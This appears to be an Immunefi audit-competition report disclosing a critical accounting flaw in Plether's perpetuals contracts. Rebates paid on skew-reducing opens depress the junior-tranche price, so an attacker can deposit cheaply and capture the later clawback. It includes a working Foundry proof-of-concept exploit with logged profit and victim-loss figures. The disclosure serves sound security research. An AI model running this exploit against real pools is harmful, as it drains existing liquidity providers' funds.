# \#99690 [SC-Critical] Open-path VPI rebate is booked as an immediate junior LP loss, so a trader can enter the junior tranche at a depressed price and capture the clawback

**Submitted on Nov 14th 2026 at 20:06:37 UTC by @kujen for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99690
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
When a skew-reducing open earns a negative VPI (a rebate), `CfdEngineSettlementSidecar.executeOpen` pays it out of pool cash immediately and parks it in the trader's own VPI rebate reserve. The rebate is guaranteed to come back to the pool on close or liquidation (the lifetime clamp in `CloseAccountingLib.buildCloseState`), but the pool books the outflow as a realized junior loss in between. I open a rebate-earning position, deposit into the junior tranche at the next epoch at the depressed price, close the position so the rebate is clawed back into pool cash, and redeem. The clawback lands mostly on my new shares, and the existing junior LPs pay for it.

## Vulnerability Details
`CfdEngineSettlementSidecar.sol:444-446` pays the rebate from the pool before anything else:

> if (delta.poolRebatePayoutAssets > 0) { IHousePool(host.pool()).payOut(host.clearinghouse(), delta.poolRebatePayoutAssets); }

and `:468-478` locks the same amount in the trader's `vpiRebateReserve`, so the money never leaves the account while the position is open. On close, `libraries/CloseAccountingLib.sol:117-119` clamps `vpiDeltaAssets` so `proportionalAccrualAssets + vpiDeltaAssets >= 0`, which charges the whole rebate back and returns it to pool cash. On liquidation `libraries/CfdEnginePlanLib.sol:1559` claws it back the same way.

So the rebate is a fully secured receivable of the pool, yet `HousePool` carries no receivable for it (no VPI term in its NAV), and the junior tranche, which is first-loss, prices deposits off the reduced cash. Anyone who deposits while the rebate is outstanding buys junior shares below their true value and collects the clawback pro rata.

The sequence:
1. A third-party trader has skewed the book (ordinary trading).
2. I open the opposite side and receive rebate R. Junior NAV drops by R.
3. I request a junior deposit of D. It settles at the next epoch mark at the depressed price.
4. I close the position. The lifetime clamp returns R to pool cash. Junior NAV recovers by R, and I own D / (J + D) of it.
5. After the one-hour deposit cooldown I redeem.

My gain is about R x D / (J + D) minus execution fees on both legs. The rebate itself nets to zero for me.

## Impact Details
With the shipped release economics (vpiFactor 1e16, maxSkewRatio 0.4, 4 bps execution fee) on a pool of 1,000,000 junior and 3,600,000 senior, a 5,000,000 junior deposit and a skew-reducing short at 39% of depth:

- rebate paid by the pool on open: 3,496.85 USDG, clawback on close: 3,501.37 USDG
- my junior shares: 5,000,360,885,697,689 versus 4,982,952,568,850,317 without the round trip (+0.35%)
- my net gain after fees and carry on both legs: 1,475.92 USDG
- the existing junior LP loses 2,909.89 USDG (0.29% of principal) against the identical timeline without my trade; senior LPs are unchanged

The loss repeats every epoch in which the book is skewed, and it scales with the rebate size and my share of the junior tranche. The junior LPs have no action available to avoid it.

## References
- packages/perps/src/CfdEngineSettlementSidecar.sol:425-503 (executeOpen)
- packages/perps/src/libraries/CloseAccountingLib.sol:104-119 (lifetime VPI clamp)
- packages/perps/src/libraries/CfdEnginePlanLib.sol:48-58, 1559 (rebate reserve target, liquidation clawback)
- packages/perps/src/TrancheVault.sol:39, 618 (one-hour deposit cooldown, the only delay)

## Proof of Concept

## Proof of Concept

Place at packages/perps/test/perps/poc/PoC_G_VpiRebateMirror.t.sol and run:

```
cd packages/perps && forge test --match-path test/perps/poc/PoC_G_VpiRebateMirror.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {VpiMockSettlementToken6} from "../shared/CfdEngineTestBase.sol";

contract PoC_G_VpiRebateMirror is Test {

    VpiMockSettlementToken6 settlementToken;
    CfdEngine engine;
    HousePool pool;
    TrancheVault juniorVault;
    TrancheVault seniorVault;
    MarginClearinghouse clearinghouse;

    uint256 constant CAP_PRICE = 2e8;
    // normalized basket near its 10y mean (0.86 - 1.12 range, mean 1.007)
    uint256 constant PRICE = 1e8;

    uint256 constant SENIOR_VICTIM_DEPOSIT = 3_600_000 * 1e6;
    uint256 constant JUNIOR_VICTIM_DEPOSIT = 1_000_000 * 1e6;
    uint256 constant ATTACKER_LP_DEPOSIT = 5_000_000 * 1e6;
    uint256 constant ATTACKER_MARGIN = 200_000 * 1e6;

    address constant SKEW_TRADER = address(0x5C);
    address constant LONG_BOOK = address(0x1B);
    address constant SHORT_BOOK = address(0x5B);
    address constant ATTACKER = address(0xA7);
    address constant JUNIOR_VICTIM = address(0x1D);
    address constant SENIOR_VICTIM = address(0x5E);

    struct Outcome {
        uint256 depthAtOpen;
        uint256 attackerNotional;
        uint256 attackerLpOut;
        uint256 attackerSharesLeft;
        int256 attackerTraderPnl;
        uint256 juniorVictimOut;
        uint256 seniorVictimValue;
        uint256 vpiPaid;
        uint256 refund;
        bool degraded;
    }

    function getAccountReservations(
        address
    ) external pure returns (IOrderRouterAccounting.AccountReservationView memory reservation) {
        return reservation;
    }

    function getMarginReservationIds(
        address
    ) external pure returns (uint64[] memory) {
        return new uint64[](0);
    }

    function syncMarginQueue(
        address
    ) external pure {}

    // arbitrum-sepolia release v1.3.1 economics
    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 1e16,
            maxSkewRatio: 4e17,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _configureShippedSeniorCapacity() internal {
        IHousePool.PoolConfig memory config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: 40_000_000 * 1e6,
            maxSeniorShareBps: 8000
        });
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function setUp() public {
        settlementToken = new VpiMockSettlementToken6();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = new CfdEngine(address(settlementToken), address(clearinghouse), CAP_PRICE, _riskParams(), 50);
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
        TerminalNavBookV2 terminalBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalBook));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));
        engine.setOrderRouter(address(this));
        clearinghouse.setEngine(address(engine));
        _configureShippedSeniorCapacity();
        vm.warp(1_709_532_000);

        settlementToken.mint(address(this), 2000e6);
        settlementToken.approve(address(pool), 2000e6);
        pool.initializeSeedPosition(false, 1000e6, address(this));
        pool.initializeSeedPosition(true, 1000e6, address(this));
        pool.activateTrading();

        _seedLp(juniorVault, JUNIOR_VICTIM, JUNIOR_VICTIM_DEPOSIT);
        _seedLp(seniorVault, SENIOR_VICTIM, SENIOR_VICTIM_DEPOSIT);

        _warpAndRefreshMark(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);

        // an ordinary, balanced book already trading
        _deposit(LONG_BOOK, 100_000 * 1e6);
        _open(LONG_BOOK, CfdTypes.Side.LONG, _sizeForNotional(500_000 * 1e6), 50_000 * 1e6);
        _deposit(SHORT_BOOK, 100_000 * 1e6);
        _open(SHORT_BOOK, CfdTypes.Side.SHORT, _sizeForNotional(500_000 * 1e6), 50_000 * 1e6);
        // an unrelated trader skews the book LONG, so the opposite side now earns a VPI rebate
        _deposit(SKEW_TRADER, 400_000 * 1e6);
        _open(SKEW_TRADER, CfdTypes.Side.LONG, _sizeForNotional((_depth() * 39) / 100), 300_000 * 1e6);
    }

    function _seedLp(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), type(uint256).max);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId));
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _warpAndRefreshMark(
        uint256 timestamp
    ) internal {
        if (timestamp > block.timestamp) {
            vm.warp(timestamp);
        }
        engine.updateMarkPrice(PRICE, uint64(block.timestamp));
    }

    function _deposit(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(account, amount);
        vm.startPrank(account);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _sizeForNotional(
        uint256 notionalAtoms
    ) internal pure returns (uint256) {
        return (notionalAtoms / PRICE) * CfdTypes.SIZE_QUANTUM;
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (CfdTypes.Order memory) {
        return CfdTypes.Order({
            account: account,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? 0 : PRICE,
            commitTime: uint64(block.timestamp),
            commitBlock: uint64(block.number),
            orderId: 0,
            side: side,
            isClose: isClose
        });
    }

    function _open(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        engine.processOrderTyped(
            _order(account, side, size, margin, false), PRICE, pool.totalAssets(), uint64(block.timestamp)
        );
    }

    function _close(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        engine.processOrderTyped(
            _order(account, side, size, 0, true), PRICE, pool.totalAssets(), uint64(block.timestamp)
        );
    }

    function _redeemAll(
        TrancheVault vault,
        address lp
    ) internal returns (uint256 assetsOut, uint256 sharesLeft) {
        uint256 shares = vault.balanceOf(lp);
        vm.prank(lp);
        uint256 redeemId = vault.requestRedeem(shares, lp, lp);
        _warpAndRefreshMark(pool.lpEpochStart(redeemId));
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimable = vault.claimableRedeemRequest(redeemId, lp);
        uint256 before = settlementToken.balanceOf(lp);
        if (claimable > 0) {
            vm.prank(lp);
            vault.claimRedeem(redeemId, claimable, lp, lp);
        }
        assetsOut = settlementToken.balanceOf(lp) - before;
        sharesLeft = shares - claimable;
    }

    function _depth() internal view returns (uint256) {
        uint256 physical = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return physical > claims ? physical - claims : 0;
    }

    function _depositLp(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), type(uint256).max);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _warpAndRefreshMark(pool.lpEpochStart(requestId));
        pool.settleLpEpoch(PRICE, block.timestamp);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimable, lp, lp);
    }

    struct Mirror {
        uint256 rebate;
        uint256 clawback;
        uint256 attackerShares;
        uint256 attackerLpOut;
        uint256 attackerSharesLeft;
        int256 attackerTraderPnl;
        uint256 juniorVictimValue;
        uint256 seniorVictimValue;
        bool degraded;
    }

    uint256 internal attackerSize;
    uint256 internal traderBefore;

    function _attackOpen(Mirror storage o) internal {
        _deposit(ATTACKER, ATTACKER_MARGIN);
        traderBefore = clearinghouse.balanceAssets(ATTACKER);
        uint256 before = pool.totalAssets();
        // reduces the LONG skew: the pool pays the rebate out of LP cash
        _open(ATTACKER, CfdTypes.Side.SHORT, attackerSize, 100_000 * 1e6);
        uint256 afterOpen = pool.totalAssets();
        o.rebate = before > afterOpen ? before - afterOpen : 0;
    }

    function _attackClose(Mirror storage o) internal {
        uint256 before = pool.totalAssets();
        // re-skews the book: the lifetime clamp claws the rebate back into pool cash
        _close(ATTACKER, CfdTypes.Side.SHORT, attackerSize);
        uint256 afterClose = pool.totalAssets();
        o.clawback = afterClose > before ? afterClose - before : 0;
        o.attackerTraderPnl = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(traderBefore);
    }

    function _finish(Mirror storage o) internal {
        // the attacker sits out the one-hour post-deposit redeem cooldown in both branches
        _warpAndRefreshMark(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
        (o.attackerLpOut, o.attackerSharesLeft) = _redeemAll(juniorVault, ATTACKER);
        _warpAndRefreshMark(block.timestamp + 1);
        o.juniorVictimValue = juniorVault.convertToAssets(juniorVault.balanceOf(JUNIOR_VICTIM));
        o.seniorVictimValue = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_VICTIM));
        o.degraded = engine.degradedMode();
    }

    // identical timeline in both branches; the only difference is the attacker's rebate open / close
    Mirror internal ctl;
    Mirror internal atkRun;

    function _mirror(
        bool attack,
        Mirror storage o
    ) internal {
        attackerSize = _sizeForNotional((_depth() * 39) / 100);
        if (attack) _attackOpen(o);
        // attacker joins the junior tranche at the next epoch mark, rebate position still open
        o.attackerShares = _depositLp(juniorVault, ATTACKER, ATTACKER_LP_DEPOSIT);
        if (attack) _attackClose(o);
        _finish(o);
    }

    function _log(Mirror storage control, Mirror storage atk) internal view {
        console2.log("rebate paid by pool on open    ", atk.rebate);
        console2.log("clawback into pool on close    ", atk.clawback);
        console2.log("attacker junior shares, control", control.attackerShares);
        console2.log("attacker junior shares, attack ", atk.attackerShares);
        console2.log("attacker LP out, control       ", control.attackerLpOut);
        console2.log("attacker LP out, attack        ", atk.attackerLpOut);
        console2.log("attacker trader leg pnl        ");
        console2.logInt(atk.attackerTraderPnl);
        console2.log("junior victim value, control   ", control.juniorVictimValue);
        console2.log("junior victim value, attack    ", atk.juniorVictimValue);
        console2.log("senior victim value, control   ", control.seniorVictimValue);
        console2.log("senior victim value, attack    ", atk.seniorVictimValue);
    }

    function test_rebateDepressedEntryStealsFromJuniorLps() public {
        uint256 snap = vm.snapshotState();
        _mirror(false, ctl);
        Mirror memory control = ctl;
        vm.revertToState(snap);
        // the revert also rolls back this contract's storage, so restore the control record
        ctl = control;
        _mirror(true, atkRun);
        Mirror memory atk = atkRun;
        _log(ctl, atkRun);

        int256 attackerGain = int256(atk.attackerLpOut) - int256(control.attackerLpOut) + atk.attackerTraderPnl;
        int256 victimLoss = int256(control.juniorVictimValue) - int256(atk.juniorVictimValue);
        console2.log("attacker net gain vs control   ");
        console2.logInt(attackerGain);
        console2.log("junior victim loss vs control  ");
        console2.logInt(victimLoss);

        assertGt(atk.rebate, 0, "the skew-reducing open is paid a rebate from pool cash");
        assertGt(atk.attackerShares, control.attackerShares, "the depressed epoch NAV mints more junior shares");
        assertEq(atk.attackerSharesLeft, 0, "attacker junior exit fully funded");
        assertGt(attackerGain, 0, "attacker profits from the rebate round trip");
        assertGe(victimLoss, attackerGain, "the existing junior LP funds the attacker's gain");
    }

}
```

## PoC Output

```
Ran 1 test for test/perps/poc/PoC_G_VpiRebateMirror.t.sol:PoC_G_VpiRebateMirror
[PASS] test_rebateDepressedEntryStealsFromJuniorLps() (gas: 9959970)
Logs:
  rebate paid by pool on open     3496847750
  clawback into pool on close     3501370339
  attacker junior shares, control 4982952568850317
  attacker junior shares, attack  5000360885697689
  attacker LP out, control        4999945229730
  attacker LP out, attack         5002862550892
  attacker trader leg pnl        
  -1441402589
  junior victim value, control    1003419313166
  junior victim value, attack     1000509424455
  senior victim value, control    3600131517181
  senior victim value, attack     3600131517181
  attacker net gain vs control   
  1475918573
  junior victim loss vs control  
  2909888711
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 65.58ms (33.65ms CPU time)
```
